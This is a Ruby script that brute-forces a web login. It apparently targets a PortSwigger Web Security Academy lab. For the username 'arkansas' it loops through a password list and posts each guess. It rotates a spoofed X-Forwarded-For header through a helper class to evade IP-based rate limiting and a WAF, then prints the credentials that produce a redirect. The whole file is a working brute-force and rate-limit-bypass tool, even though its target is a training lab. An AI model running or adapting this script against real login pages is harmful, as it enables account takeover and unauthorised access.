# frozen_string_literal: true

require 'uri'
require 'net/http'
require './bypass_waf'

TARGET = 'https://0a56002803b6b48bc17aaa1c00a30021.web-security-academy.net/login'

uri = URI(TARGET)

PASSWORDS = 'password_list.txt'
CANDIDATE = 'arkansas'

# Used to bypass WAF
spoofed_ip = BypassWAF.new
File.readlines(PASSWORDS).each do |line|
  l = line.strip
  res = Net::HTTP.post(
    uri,
    "username=#{CANDIDATE}&password=#{l}",
    'Content-Type' => 'application/x-www-form-urlencoded', 'X-Forwarded-For' => spoofed_ip.to_s
  )
  puts 'Rate-Limited' if res.body.include?(
    '<p class=is-warning>You have made too many incorrect login attempts. Please try again in 30 minute(s).</p>'
  )
  puts "Tried #{CANDIDATE}:#{l}\tX-Forward-For:#{spoofed_ip}\tcode:#{res.code}"
  spoofed_ip.increment
  next if res.code == '200'

  puts "#{CANDIDATE}:#{l}"
  break
end
